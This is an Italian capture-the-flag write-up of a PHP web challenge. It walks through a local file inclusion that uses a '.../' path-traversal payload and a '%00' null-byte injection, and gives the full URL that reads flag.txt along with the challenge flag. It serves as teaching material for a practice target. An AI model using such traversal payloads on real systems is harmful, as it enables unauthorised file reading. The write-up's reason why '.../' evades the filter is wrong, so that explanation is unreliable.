# Writeup: Light or Dark?

## Overview
- **Categoria:** Web  
- **Autore:** davidedc97  
- **Difficoltà:** 483  
- **Stato:** Down (last checked: a day ago)  
- **URL:** [http://lightdark.challs.olicyber.it](http://lightdark.challs.olicyber.it)

## Descrizione 📝
La challenge presenta un semplice sito web che permette di selezionare il tema **Light** o **Dark**. Tuttavia, il codice sorgente (`index.php`) rivela la possibilità di manipolare il parametro `tema` per accedere a file arbitrari sul file system. La versione di PHP menzionata è la **4**, il che suggerisce che alcune vecchie tecniche (come la **null byte injection**) potrebbero funzionare.

### Estratto del Codice Sorgente
```php
<?php
if(!isset($_GET["tema"])) $path = "light.css";  // Default
else {
    $path = $_GET["tema"];
    if (preg_match("/..\//", $path)) {  // Non è bene andare in giro per il file system..
        $path = str_replace('../', './' , $path);
        
        // Facciamo un filtro sull'estensione del tema richiesto, giusto per sicurezza c:
        $error = false;
        $arr = explode(".", $path);
        $estensione = $arr[count($arr)-1];

        if($estensione != "css"){
            $error = true;
            $path = substr($path, 0, -3) . "css";
        }
    }
}

$css = "static/css/" . $path;
?>
```
Il file CSS selezionato viene incluso in un tag `<style>` tramite:
```php
<style>
    <?php echo file_get_contents($css); ?>
</style>
```
Pertanto, se riusciamo a manipolare il percorso `tema`, potremo caricare file arbitrari (come `flag.txt`) e leggerne il contenuto sotto forma di CSS.

## Soluzione 🎯

### 1. Analisi dei Controlli
- **Filtro `../`**: Se viene rilevato `../`, il codice lo sostituisce con `./`.  
- **Filtro sull’estensione**: Se il file non finisce in `.css`, il codice forza l’estensione `.css`.  
- **Versione PHP 4**: Potrebbe supportare la **null byte injection** (`%00`), che tronca il nome del file prima del `.css`.

### 2. Bypass dei Filtri
1. **`../` sostituito con `./`**  
   Possiamo usare `.../` (tre punti) per aggirare il replace. Al posto di `../`, la stringa `.../` non viene intercettata da `preg_match("/..\//", ...)` perché non combacia con due punti seguiti da slash esattamente.
2. **Null Byte Injection**  
   Aggiungendo `%00` (byte nullo) prima del `.css`, in molte versioni di PHP 4 il file viene troncato prima del null byte. Quindi il server leggerà effettivamente `flag.txt`, ignorando la parte successiva (`.css`).

### 3. Costruzione dell’URL
Per navigare nella struttura delle directory fino alla root (o directory dove si trova `flag.txt`), usiamo 5 volte `.../` e poi `%00.css`:
```
http://lightdark.challs.olicyber.it/index.php?tema=.../.../.../.../.../flag.txt%00.css
```
**Spiegazione**: 
- `.../` elude il filtro su `../`.  
- `%00.css` induce PHP a troncare il nome del file a `flag.txt` anziché `flag.txt.css`.

### 4. Lettura della Flag
Non vedremo la flag nella pagina direttamente, poiché viene caricata come CSS. Per visualizzare il sorgente HTML e dunque il contenuto dello `<style>`, possiamo utilizzare:
```
view-source:http://lightdark.challs.olicyber.it/index.php?tema=.../.../.../.../.../flag.txt%00.css
```
All’interno di `<style>` troveremo:

## Flag 🏁
```
flag{l1ght_1s_f0r_n00bs_d4rk_1s_f0r_h4ck3rs}
```

## Lezioni Apprese 📚
1. **Null Byte Injection**: Nelle versioni vecchie di PHP, il carattere `\0` (`%00`) può troncare il nome del file.  
2. **Aggirare i Filtri**: La sostituzione di `../` con `./` può essere bypassata usando `.../`.  
3. **Includere File Arbitrari**: L’uso di `file_get_contents()` senza adeguati controlli permette un classico Local File Inclusion.  
4. **Versioni Legacy di PHP**: Le vulnerabilità di path e filename injection sono particolarmente diffuse in PHP 4.x.

## Tools Utilizzati 🛠️
- **Browser**: Per testare l’URL manipolato.  
- **View Source**: Per visualizzare il contenuto `<style>` e trovare la flag.

---

*Writeup by Luca Crippa - Last Updated: 2024*
